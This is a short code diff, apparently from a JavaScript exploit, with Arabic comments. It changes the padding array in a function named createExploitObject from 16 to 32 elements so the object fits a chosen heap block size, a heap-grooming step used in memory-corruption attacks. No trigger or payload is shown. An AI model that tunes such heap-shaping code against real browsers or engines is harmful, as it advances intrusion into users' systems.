@@ -16,7 +16,7 @@
     function createExploitObject() {
         // حجم المصفوفة هنا يحدد حجم الكائن في الذاكرة بدقة (128-byte block target)
         return {
-            padding: new Array(16).fill(0x1337), // تلاعب بحجم الـ Padding
+            padding: new Array(32).fill(0x1337), // تلاعب بحجم الـ Padding
             marker: 0xDEADBEEF
         };
     }
